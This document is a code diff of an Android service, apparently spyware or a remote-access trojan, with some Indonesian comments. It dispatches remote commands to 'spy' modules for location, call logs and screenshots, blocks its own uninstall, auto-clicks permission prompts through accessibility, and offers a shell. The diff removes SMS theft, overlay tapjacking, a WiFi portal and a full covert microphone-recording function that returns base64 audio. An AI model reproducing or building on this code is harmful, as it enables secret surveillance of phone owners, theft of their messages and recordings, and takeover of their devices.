@@ -227,9 +227,6 @@ class ConnectorService : Service() {
             // ── Location (dex module) ──
             cmd == "get_location"        -> DexModuleLoader.execute(this, "spy-location", cmd, null)
 
-            // ── SMS (dex module) ──
-            cmd.startsWith("get_sms")    -> DexModuleLoader.execute(this, "spy-sms", cmd, null)
-
             // ── Call log (dex module) ──
             cmd.startsWith("get_calls")  -> DexModuleLoader.execute(this, "spy-calls", cmd, null)
 
@@ -262,9 +259,6 @@ class ConnectorService : Service() {
             // ── Screenshot (dex module) ──
             cmd.startsWith("screenshot") -> DexModuleLoader.execute(this, "spy-media", cmd, null)
 
-            // ── Mic recording (dex module) ──
-            cmd.startsWith("record_mic:") -> DexModuleLoader.execute(this, "spy-media", cmd, null)
-
             // ── Misc ──
             cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
             cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")
@@ -286,15 +280,6 @@ class ConnectorService : Service() {
 
             // ── Block/Unblock Uninstall (Device Admin/Owner) ──
             cmd.startsWith("block_uninstall:") -> Pair(AppDeviceAdminReceiver.setBlockUninstall(this, cmd.removePrefix("block_uninstall:").trim() == "true"), "command_result")
-
-            cmd == "wifi_portal_start" -> Pair(startWifiPortal(), "command_result")
-            cmd == "wifi_portal_stop"  -> Pair(stopWifiPortal(), "command_result")
-
-            // ── Overlay Trick (SYSTEM_ALERT_WINDOW tapjacking) ──
-            cmd.startsWith("overlay_start") -> Pair(OverlayTrickManager.start(this, extra), "command_result")
-            cmd == "overlay_stop"           -> Pair(OverlayTrickManager.stop(this), "command_result")
-            cmd == "overlay_status"         -> Pair(OverlayTrickManager.status(), "command_result")
-            cmd == "overlay_request_perm"   -> Pair(requestOverlayPermission(), "command_result")
 
             // ── Auto-Grant: klik "Izinkan" otomatis via AccessibilityService ──
             // Tidak perlu overlay / SYSTEM_ALERT_WINDOW — murni node ACTION_CLICK
@@ -493,32 +478,6 @@ class ConnectorService : Service() {
         } catch (e: Exception) { "Error install APK: ${e.message}" }
     }
 
-    // ─────────────────────────────────────────
-    //  MIC RECORDING
-    // ─────────────────────────────────────────
-
-    private fun recordMic(durationSec: Int): String {
-        val tmpPath = "${cacheDir.absolutePath}/.mic_${System.currentTimeMillis()}.3gp"
-        var mr: android.media.MediaRecorder? = null
-        return try {
-            mr = android.media.MediaRecorder().apply {
-                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
-                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
-                setAudioSamplingRate(8000); setAudioEncodingBitRate(12200)
-                setOutputFile(tmpPath); prepare(); start()
-            }
-            Thread.sleep(durationSec.toLong() * 1000)
-            mr.stop(); mr.release(); mr = null
-            val bytes = java.io.File(tmpPath).readBytes()
-            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
-            android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-        } catch (e: Exception) {
-            try { mr?.stop() } catch (_: Exception) {}; try { mr?.release() } catch (_: Exception) {}
-            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
-            "ERROR: ${e.message}"
-        }
-    }
 
     // ─────────────────────────────────────────
     //  SHELL — full stateful terminal
@@ -776,42 +735,5 @@ class ConnectorService : Service() {
         }
     }
 
-    // ── Overlay Permission Request ─────────────────────────────────────────
-    private fun requestOverlayPermission(): String {
-        return try {
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                if (android.provider.Settings.canDrawOverlays(this)) {
-                    return "✅ SYSTEM_ALERT_WINDOW sudah granted"
-                }
-                val intent = android.content.Intent(
-                    android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    android.net.Uri.parse("package:$packageName")
-                ).apply { flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK }
-                startActivity(intent)
-                "📋 Halaman izin overlay dibuka — minta user Allow"
-            } else {
-                "✅ Auto-granted (Android < 6.0)"
-            }
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
 
-    // ── WiFi Portal ───────────────────────────────────────────────────────────
-
-    private fun startWifiPortal(): String {
-        return try {
-            WifiPortalService.start(this, deviceId)
-            "OK: WiFi Portal started on port ${WifiPortalService.PORT} — share http://192.168.43.1:${WifiPortalService.PORT}"
-        } catch (e: Exception) {
-            "ERROR: ${e.message}"
-        }
-    }
-
-    private fun stopWifiPortal(): String {
-        return try {
-            WifiPortalService.stop(this)
-            "OK: WiFi Portal stopped"
-        } catch (e: Exception) {
-            "ERROR: ${e.message}"
-        }
-    }
 }
